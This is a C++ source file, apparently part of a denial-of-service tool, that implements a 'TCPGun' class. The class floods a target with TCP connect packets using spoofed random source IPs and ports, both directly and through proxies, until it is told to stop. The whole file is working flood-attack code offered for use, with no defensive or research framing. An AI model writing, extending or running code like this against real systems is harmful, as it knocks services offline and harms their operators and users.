#include <netdb.h>
#include <netinet/in.h>

#include "spdlog/spdlog.h"

#include "tcp_gun.h"

#include "api_interface.h"
#include "config.h"
#include "utils.h"

using namespace Attackers;

std::size_t TCPGun::FireTillDead(const URI &targetToKill) noexcept
{
	std::size_t hitsCount{0};

	SPDLOG_INFO("Firing TCP at {} without proxy", targetToKill);
	FireWithoutProxy(targetToKill, hitsCount);

	SPDLOG_INFO("Firing TCP at {} with proxy", targetToKill);
	FireWithProxy(targetToKill, hitsCount);

	return hitsCount;
}

bool TCPGun::FireWithoutProxy(const URI &targetToKill, std::size_t &hitsCount) noexcept
{
	// Checking connectivity over proxy, because packets would be send with randomized source
	const auto resolvedAddress{m_attacker.TryResolveAddress(targetToKill, {})};
	if(!resolvedAddress)
	{
		SPDLOG_WARN("Cannot resolve {} address", targetToKill);
		return false;
	}

	std::size_t errorsCount{0};
	while(!m_currentTask.ShouldStop())
	{
		if(!resolvedAddress || !ShootTarget(*resolvedAddress, hitsCount) ||
			++errorsCount > AttackerConfig::TCPAttacker::MAX_ERRORS_BEFORE_CHECK)
		{
			SPDLOG_WARN("Too many errors emited on TCP flooding, leaving");
			return false;
		}
	}
	return false;
}

void TCPGun::FireWithProxy(const URI &targetToKill, std::size_t &hitsCount) noexcept
{
	std::optional<std::vector<Proxy>> proxies;
	while(!m_currentTask.ShouldStop() &&
		!(proxies = m_proxyGetter->GetProxies()).has_value())
	{
	}

	// Checking connectivity over proxy, because packets would be send with randomized source
	auto resolvedAddress{m_attacker.TryResolveAddress(targetToKill, *proxies)};
	while(!m_currentTask.ShouldStop() && resolvedAddress)
	{
		ShootTarget(*resolvedAddress, hitsCount);
		resolvedAddress = m_attacker.TryResolveAddress(targetToKill, *proxies);
	}
}

bool TCPGun::ShootTarget(const URI &targetToShoot, std::size_t &hitsCount)
{
	size_t count = 0;
	for(; count < AttackerConfig::TCPAttacker::TCP_ATTACKS_BEFORE_CHECK
			&& !m_currentTask.ShouldStop(); count++)
	{
		URI fakeSource{NetUtil::GetRandomIP()};
		fakeSource.SetPort(NetUtil::GetRandomPort());

		const TCPWrapper::TCPStatus sendStatus = m_attacker.SendConnectPacket(fakeSource, targetToShoot);
		switch (sendStatus)
		{
			case TCPWrapper::TCPStatus::GotError:
			{
				hitsCount += count;
				SPDLOG_WARN("Something went wrong durring sending packet to: {}", targetToShoot);
				return true;
			}
			case TCPWrapper::TCPStatus::NeedConnectivityCheck:
			{
				SPDLOG_WARN("Connectivity issues");
				break;
			}

			case TCPWrapper::TCPStatus::Success:
			default:
			break;
		}
	}
	SPDLOG_INFO("Already sent: {} packets to {}, rechecking target...", count, 
		targetToShoot);
	hitsCount += count;
	return false;
}
